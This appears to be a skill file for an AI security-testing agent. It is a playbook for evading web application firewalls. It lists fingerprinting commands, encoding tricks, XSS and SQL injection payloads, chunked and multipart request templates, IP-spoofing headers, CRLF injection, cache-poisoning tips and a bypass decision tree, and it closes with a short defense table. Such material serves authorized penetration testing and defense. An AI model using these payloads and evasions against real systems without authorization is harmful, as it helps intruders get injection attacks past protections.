---
name: waf-bypass-techniques
display_name: WAF 绕过技术
description: >-
  WAF bypass methodology and generic evasion techniques. Use when a web application
  firewall blocks injection payloads (SQLi, XSS, RCE) and you need to craft
  bypasses using encoding, protocol-level tricks, or WAF-specific weaknesses.
---

# SKILL: WAF Bypass Techniques — Evasion Playbook

> **AI LOAD INSTRUCTION**: Covers WAF identification, generic bypass categories (encoding, protocol abuse, HTTP/2, parameter pollution), and a decision tree. For product-specific bypasses (Cloudflare, AWS WAF, ModSecurity, Akamai, etc.), load [WAF_PRODUCT_MATRIX.md](./WAF_PRODUCT_MATRIX.md). Base models often suggest basic encoding but miss protocol-level bypasses and WAF behavioral quirks.

## 0. RELATED ROUTING

- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) for payloads to deliver after bypassing WAF
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS payloads that need WAF evasion
- [request-smuggling](../request-smuggling/SKILL.md) when smuggling can route requests around WAF entirely
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) HPP is itself a WAF bypass primitive
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) when WAF blocks inline scripts but CSP bypass is available
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) **Java backends only** — when every encoding trick above is blocked, use Ghost Bits: Java's 16-bit `char` to 8-bit `byte` narrowing produces 255 Unicode bypass variants per dangerous ASCII byte; re-enables WAF-patched CVEs in Tomcat, Spring, Jetty, Jackson, Fastjson, BCEL, and more

### Product-Specific Reference

Load [WAF_PRODUCT_MATRIX.md](./WAF_PRODUCT_MATRIX.md) when you need per-product bypass techniques for Cloudflare, AWS WAF, ModSecurity CRS, Akamai, Imperva, F5 BIG-IP, or Sucuri.

---

## 1. PHASE 0 — IDENTIFY THE WAF

Before bypassing, know what you're fighting.

### 1.1 Tools

| Tool | Usage |
|---|---|
| `wafw00f target.com` | Fingerprint WAF vendor from response headers/behavior |
| `nmap --script=http-waf-detect` | NSE script for WAF detection |
| Manual header inspection | `Server`, `X-CDN`, `X-Cache`, `cf-ray` (Cloudflare), `x-sucuri-id`, `x-akamai-*` |

### 1.2 Behavioral Fingerprinting

```
1. Send benign request → record baseline response (status, headers, body size)
2. Send obvious attack: /?q=<script>alert(1)</script>
3. Compare: 403? Custom block page? Redirect? Connection reset?
4. Block page content reveals WAF: "Cloudflare", "Access Denied (Imperva)", "ModSecurity"
5. If transparent proxy: check response time difference (WAF adds latency)
```

---

## 2. GENERIC BYPASS CATEGORIES

### 2.1 Encoding Bypasses

| Technique | Example | Bypasses |
|---|---|---|
| URL encoding | `%3Cscript%3E` | Basic string matching |
| Double URL encoding | `%253Cscript%253E` | WAFs that decode once, app decodes twice |
| Unicode encoding | `%u003Cscript%u003E` | IIS-specific Unicode normalization |
| HTML entities | `&#60;script&#62;` or `&#x3c;script&#x3e;` | WAFs not performing HTML entity decoding |
| Hex encoding (SQL) | `0x756E696F6E` = `union` | WAFs matching SQL keywords |
| Octal encoding | `\74script\76` | Rare but some parsers handle it |
| Overlong UTF-8 | `%C0%BC` (invalid encoding for `<`) | Legacy parsers with loose UTF-8 handling |
| Mixed case | `SeLeCt`, `uNiOn` | Case-sensitive rule matching |
| Null byte | `sel%00ect` | WAFs that stop parsing at null |

### 2.2 Chunked Transfer Encoding

Split the payload across HTTP chunks so no single chunk contains the blocked pattern:

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
sel
3
ect
1
 
4
from
0

```

WAFs that inspect the full body may not reassemble chunks before matching.

### 2.3 HTTP/2 Binary Format Bypasses

HTTP/2 transmits headers as binary HPACK-encoded frames. Some WAFs only inspect after downgrading to HTTP/1.1:

- Header names can contain characters illegal in HTTP/1.1
- Pseudo-headers (`:method`, `:path`) bypass header-based WAF rules
- H2 → H1 downgrade may introduce request smuggling (see [request-smuggling](../request-smuggling/SKILL.md))

### 2.4 HTTP Parameter Pollution (HPP)

Different servers handle duplicate parameters differently:

| Server | Behavior for `?a=1&a=2` |
|---|---|
| PHP/Apache | Last value: `a=2` |
| ASP.NET/IIS | Concatenated: `a=1,2` |
| Python/Flask | First value: `a=1` |
| Node.js/Express | Array: `a=[1,2]` |

WAF checks `a=1` (benign), app uses `a=2` (malicious). Or combine: `a=sel&a=ect` → ASP.NET sees `a=sel,ect`.

### 2.5 IP Source Spoofing (Bypass IP-Based Rules)

Headers trusted by some WAFs/apps for client IP:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

Use case: WAF whitelists internal IPs or has different rule sets per source.

### 2.6 Path Normalization Tricks

| Technique | Example | Effect |
|---|---|---|
| Dot segments | `/./admin` or `/../target/admin` | WAF sees different path than app |
| Double slash | `//admin` | Some normalizers collapse, WAFs may not |
| URL encoding path | `/%61dmin` | WAF sees encoded, app decodes |
| Null byte in path | `/admin%00.jpg` | Legacy: app truncates at null, WAF sees .jpg |
| Backslash (IIS) | `/admin\..\/secret` | IIS treats `\` as `/` |
| Trailing dot/space | `/admin.` or `/admin%20` | OS-level normalization (Windows) |
| Semicolon (Tomcat) | `/admin;jsessionid=x` | Tomcat strips after `;`, WAF may not |

### 2.7 Content-Type Manipulation

WAFs often have format-specific parsers. Switching Content-Type can bypass rules:

```
Default:  Content-Type: application/x-www-form-urlencoded  → WAF parses params
Switch:   Content-Type: application/json  → WAF may not parse JSON body
Switch:   Content-Type: multipart/form-data  → WAF may not inspect all parts
Switch:   Content-Type: text/xml  → WAF expects XML, payload in different format
```

**Trick**: If app accepts both JSON and form-urlencoded, use JSON — WAFs often have weaker JSON inspection rules.

### 2.8 Multipart Boundary Abuse

```http
Content-Type: multipart/form-data; boundary=----WAFBypass

------WAFBypass
Content-Disposition: form-data; name="q"

<script>alert(1)</script>
------WAFBypass--
```

Variations: long boundary strings, boundary with special characters, missing final boundary, nested multipart.

### 2.9 Newline & Whitespace Injection

```sql
-- SQL keyword splitting
SEL
ECT * FROM users

-- SQL comment insertion
SEL/**/ECT * FR/**/OM users
UN/**/ION SEL/**/ECT 1,2,3

-- Tab/vertical tab as separator
SELECT\t*\tFROM\tusers
```

### 2.10 Keyword Splitting & Alternative Syntax

| Blocked | Alternative |
|---|---|
| `UNION SELECT` | `UNION ALL SELECT`, `UNION DISTINCT SELECT` |
| `OR 1=1` | `OR 2>1`, `OR 'a'='a'`, `||1` |
| `<script>` | `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>` |
| `alert(1)` | `prompt(1)`, `confirm(1)`, `print()` (Chrome) |
| `eval()` | `Function('code')()`, `setTimeout('code',0)` |
| `' OR '1'='1` | `' OR 1-- -`, `'\|\|'1` |
| `SLEEP(5)` | `BENCHMARK(5000000,SHA1('x'))`, `pg_sleep(5)` |

---

## 3. PROTOCOL-LEVEL BYPASS TECHNIQUES

### 3.1 Request Line Abuse

```http
GET /path?q=attack HTTP/1.1    ← WAF inspects
```

vs.

```http
GET http://target.com/path?q=attack HTTP/1.1   ← Absolute URI: some WAFs miss the path
```

### 3.2 Header Injection via CRLF

If WAF inspects original headers but app processes injected ones:

```
X-Custom: value\r\nX-Forwarded-For: 127.0.0.1
```

### 3.3 Connection-State Bypass

```
1. Establish connection through WAF (normal request)
2. On same keep-alive connection, send attack request
3. Some WAFs reduce inspection on subsequent requests in same connection
```

---

## 4. WAF BYPASS DECISION TREE

```
Payload blocked by WAF?
├── Identify WAF (wafw00f, response headers, block page)
│
├── Try encoding bypasses
│   ├── URL encode payload → still blocked?
│   ├── Double URL encode → still blocked?
│   ├── Unicode/overlong UTF-8 → still blocked?
│   ├── Mixed case keywords → still blocked?
│   └── HTML entities (for XSS) → still blocked?
│
├── Try protocol-level bypasses
│   ├── Switch Content-Type (JSON, multipart, XML)
│   │   └── App accepts alternate format? → re-send payload
│   ├── HTTP Parameter Pollution (duplicate params)
│   ├── Chunked Transfer-Encoding to split payload
│   ├── HTTP/2 direct if available (binary framing bypass)
│   └── Request line: absolute URI format
│
├── Try path-based bypasses
│   ├── Path normalization (/./path, //path, ;param)
│   ├── Different HTTP method (POST vs PUT vs PATCH)
│   └── Alternate endpoint serving same function
│
├── Try payload mutation
│   ├── SQL: comments (/**/), alternative functions, hex literals
│   ├── XSS: alternative tags/events, JS template literals
│   ├── RCE: wildcard abuse, string concatenation, variable expansion
│   └── Check WAF_PRODUCT_MATRIX.md for vendor-specific mutations
│
├── Try IP-source bypass
│   ├── X-Forwarded-For / True-Client-IP spoofing
│   ├── Access origin server directly (bypass CDN)
│   └── Find origin IP (Shodan, historical DNS, email headers)
│
└── Try request smuggling to skip WAF entirely
    └── See ../request-smuggling/SKILL.md
```

---

## 5. COMMON MISTAKES & TRICK NOTES

1. **Test bypass with actual exploitation, not just 200 OK**: WAF may return 200 but strip the payload silently.
2. **WAFs often have size limits**: Very large request bodies (>8KB–128KB depending on WAF) may bypass inspection entirely.
3. **Rate limiting ≠ WAF**: Getting 429s is rate limiting, not payload blocking. Different bypass needed.
4. **CDN caching**: If the WAF is at CDN level, cached responses bypass WAF on subsequent requests. Poison cache with clean request, exploit cache.
5. **Origin server direct access**: If you find the origin IP behind CDN/WAF, connect directly — WAF is bypassed completely.
6. **Multipart file upload fields**: WAFs often skip inspection of file content in multipart uploads — embed payload in filename or file content if reflected.

---

## 6. DEFENSE PERSPECTIVE

| Measure | Notes |
|---|---|
| WAF + application-level input validation | WAF is a layer, not a fix |
| Parameterized queries | Eliminates SQLi regardless of WAF |
| CSP + output encoding | Eliminates XSS regardless of WAF |
| Regularly update WAF rules | Vendor signatures lag behind new bypasses |
| Deny by default, not block-list | Allowlist valid input patterns |
| Log and alert on WAF blocks | Bypass attempts are visible in logs |
